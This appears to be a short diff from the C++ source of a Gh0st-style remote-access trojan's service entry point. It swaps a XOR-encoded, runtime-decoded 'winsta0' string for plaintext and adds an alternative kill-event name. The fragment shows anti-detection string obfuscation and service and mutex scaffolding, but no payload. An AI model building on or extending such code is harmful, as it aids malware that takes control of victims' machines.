@@ -59,14 +59,17 @@ DWORD WINAPI main(char *lpServiceName)
 	// Set Window Station
 	HWINSTA hOldStation = GetProcessWindowStation();
 
-	
-	char winsta0[] = { 0x07,0xbc,0xa3,0xa7,0xbb,0xb3,0xa7,0xf5};// winsta0
-	char* lpszWinSta = decodeStr(winsta0);						// 解密函数
+	//---------------------------------------------------------------------------
+	//char winsta0[] = { 0x07,0xbc,0xa3,0xa7,0xbb,0xb3,0xa7,0xf5};// winsta0
+	//char* lpszWinSta = decodeStr(winsta0);						// 解密函数
+	//
+	//HWINSTA hWinSta = OpenWindowStation(lpszWinSta, FALSE, MAXIMUM_ALLOWED);
+	//
+	//memset(lpszWinSta, 0, winsta0[STR_CRY_LENGTH]);				// 填充0
+	//delete lpszWinSta;											// 释放
 
-	HWINSTA hWinSta = OpenWindowStation(lpszWinSta, FALSE, MAXIMUM_ALLOWED);
-
-	memset(lpszWinSta, 0, winsta0[STR_CRY_LENGTH]);				// 填充0
-	delete lpszWinSta;											// 释放
+	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
+	//---------------------------------------------------------------------------
 
 	if (hWinSta != NULL)
 		SetProcessWindowStation(hWinSta);
@@ -82,6 +85,7 @@ DWORD WINAPI main(char *lpServiceName)
 
 		lstrcpy(strServiceName, lpServiceName);
 		wsprintf(strKillEvent, "Global\\CcRem %d", GetTickCount()); // 随机事件名
+		//wsprintf(strKillEvent, "Global\\Net_%d", GetTickCount()); // 随机事件名
 
 		hInstallMutex = CreateMutex(NULL, true, g_strHost);
 		// ReConfigService(strServiceName); 
